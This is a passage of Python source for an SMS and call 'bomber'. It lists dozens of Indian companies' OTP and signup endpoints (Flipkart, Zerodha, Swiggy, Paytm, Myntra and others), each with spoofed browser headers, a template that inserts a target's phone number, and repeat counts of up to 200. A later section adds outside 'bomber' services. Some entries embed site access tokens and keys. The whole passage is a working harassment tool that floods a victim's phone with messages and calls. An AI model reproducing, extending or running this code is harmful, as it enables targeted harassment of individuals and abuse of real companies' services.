            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 5
    },
    {
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://kwikfixauto.in",
            "referer": "https://kwikfixauto.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 3
    },
    {
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "brevi-channel": "DESKTOP_WEB",
            "content-type": "application/json",
            "origin": "https://www.brevistay.com",
            "referer": "https://www.brevistay.com/login",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone}),
        "count": 15
    },
    {
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Origin": "https://hourlyrooms.co.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "content-type": "application/json",
            "platform": "web-2.0.0"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 1
    },
    {
        "url": "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data",
            "delivery-type": "instant",
            "mm-build-version": "1.0.1",
            "mm-device-type": "web",
            "origin": "https://madrasmandi.in",
            "referer": "https://madrasmandi.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n',
        "count": 3
    },
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 50
    },
    {
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "referer": "https://web.pagarbook.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "userrole": "EMPLOYER"
        },
        "data": lambda phone: json.dumps({"phone": phone, "language": 1}),
        "count": 5
    },
    {
        "url": "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.vahak.in",
            "referer": "https://www.vahak.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "is_whatsapp": False}),
        "count": 1
    },
    {
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://redcliffelabs.com",
            "referer": "https://redcliffelabs.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "short": True}),
        "count": 1
    },
    {
        "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "ixiweb\u00212$",
            "clientid": "ixiweb",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.ixigo.com",
            "referer": "https://www.ixigo.com/?loginVisible=true",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"sixDigitOTP=true&prefix=%2B91&resendOnCall=false&resendOnWhatsapp=false&phone={phone}",
        "count": 1
    },
    {
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "referer": "https://55club08.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA"}),
        "count": 1
    },
    {
        "url": "https://zerodha.com/account/registration.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://zerodha.com",
            "referer": "https://zerodha.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""}),
        "count": 100
    },
    {
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "referer": "https://www.aakash.ac.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        "data": lambda phone: json.dumps({"mobile_psid": phone, "mobile_number": "", "activity_type": "aakash-myadmission"}),
        "count": 100
    },
    {
        "url": "https://api.testbook.com/api/v2/mobile/signup",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "referer": "https://testbook.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-tb-client": "web,1.2"
        },
        "data": lambda phone: json.dumps({"mobile": phone}),
        "count": 1
    },
    {
        "url": "https://loginprod.medibuddy.in/unified-login/user/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "referer": "https://www.medibuddy.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow"}),
        "count": 50
    },
    {
        "url": "https://api.tradeindia.com/home/registration/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data",
            "origin": "https://www.tradeindia.com",
            "referer": "https://www.tradeindia.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n',
        "count": 1
    },
    {
        "url": "https://www.beyoung.in/api/sendOtp.json",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ==",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.beyoung.in",
            "referer": "https://www.beyoung.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0}),
        "count": 100
    },
    {
        "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "referer": "https://wrogn.com/",
            "shop_name": "wrogn-website.myshopify.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com", "recaptcha_token": ""}),
        "count": 5
    },
    {
        "url": "https://app.medkart.in/api/v1/auth/requestOTP",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app-platform": "web",
            "content-type": "application/json",
            "device_id": "6641194520998",
            "langcode": "en",
            "origin": "https://www.medkart.in",
            "referer": "https://www.medkart.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_no": phone}),
        "count": 1
    },
    {
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "isweb": "true",
            "origin": "https://mamaearth.in",
            "referer": "https://mamaearth.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "referralCode": ""}),
        "count": 10
    },
    {
        "url": "https://www.coverfox.com/otp/send/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.coverfox.com",
            "referer": "https://www.coverfox.com/user-login/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}",
        "count": 5
    },
    {
        "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.woodenstreet.com",
            "referer": "https://www.woodenstreet.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&login=2",
        "count": 5
    },
    {
        "url": "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27",
            "Content-Type": "application/json",
            "Origin": "https://gomechanic.in",
            "Referer": "https://gomechanic.in/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"}),
        "count": 50
    },
    {
        "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en",
            "client-code": "vulpix",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "referer": "https://www.lovelocal.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"}),
        "count": 50
    },
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 1
    },
    {
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"phone={phone}",
        "count": 3
    },
    {
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.woodenstreet.com",
            "referer": "https://www.woodenstreet.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001", "lastname": "", "customer_id": ""}),
        "count": 200
    },
    # ============ APIs FROM boomapi.txt ============
    {
        "name": "FreeFire Bomber",
        "url": lambda phone: f"https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=60",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"},
        "count": 10
    },
    {
        "name": "Call Bomber API",
        "url": lambda phone: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"},
        "count": 10
    },
    {
        "name": "Bomberr API",
        "url": lambda phone: f"https://bomberr.onrender.com/num={phone}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"},
        "count": 10
    },
    {
        "name": "Lenskart Advanced",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Hungama Advanced",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web","variant":"v1","templateCode":1}}',
        "count": 15
    },
    {
        "name": "Meru Cab Advanced",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "data": lambda phone: f"mobile_number={phone}",
        "count": 15
    },
    {
        "name": "Dayco India Advanced",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp",
        "count": 15
    },
    {
        "name": "NoBroker Advanced",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN",
        "count": 15
    },
    {
        "name": "ShipRocket Advanced",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "count": 15
    },
    {
        "name": "PenPencil Advanced",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "1mg Advanced",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
        "count": 15
    },
    {
        "name": "KPN Fresh Web",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}',
        "count": 15
    },
    {
        "name": "KPN Fresh Android",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
        "count": 15
    },
    {
        "name": "Servetel Advanced",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}",
        "count": 15
    },
    {
        "name": "Swiggy Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
        "count": 15
    },
    {
        "name": "Doubtnut Advanced",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}',
        "count": 15
    },
    {
        "name": "GoPink Cabs Advanced",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}",
        "count": 15
    },
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Flipkart",
        "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Amazon",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"email={phone}&create=1",
        "count": 15
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/php/asyncLogin.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}",
        "count": 15
    },
    {
        "name": "Paytm",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}}',
        "count": 15
    },
    {
        "name": "PhonePe",
        "url": "https://www.phonepe.com/api/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Meesho",
        "url": "https://api.meesho.com/v2/auth/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Snapdeal",
        "url": "https://www.snapdeal.com/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Makemytrip",
        "url": "https://www.makemytrip.com/api/umbrella/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "OYO",
        "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Rapido",
        "url": "https://rapido.bike/api/v2/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Uber",
        "url": "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Domino's",
        "url": "https://order.godominos.co.in/Online/App.aspx",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"PhoneNo={phone}",
        "count": 15
    },
    {
        "name": "BookMyShow",
        "url": "https://in.bmscdn.com/mjson/User/SendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Netmeds",
        "url": "https://www.netmeds.com/api/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Medlife",
        "url": "https://api.medlife.com/v2/user/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Practo",
        "url": "https://www.practo.com/patient/loginviapassword",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Ajio",
        "url": "https://www.ajio.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Croma",
        "url": "https://api.croma.com/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Reliance Digital",
        "url": "https://www.reliancedigital.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "FirstCry",
        "url": "https://www.firstcry.com/api/sendotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Licious",
        "url": "https://api.licious.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Zepto",
        "url": "https://api.zepto.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Blinkit",
        "url": "https://blinkit.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Mobikwik",
        "url": "https://www.mobikwik.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Freecharge",
        "url": "https://www.freecharge.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Airtel Thanks",
        "url": "https://www.airtel.in/thanks-app/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Jio",
        "url": "https://www.jio.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Vodafone Idea",
        "url": "https://www.myvi.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Byju's",
        "url": "https://byjus.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Unacademy",
        "url": "https://unacademy.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Vedantu",
        "url": "https://www.vedantu.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Toppr",
        "url": "https://www.toppr.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "WhiteHat Jr",
        "url": "https://www.whitehatjr.com/api/otp",
        "method": "POST",
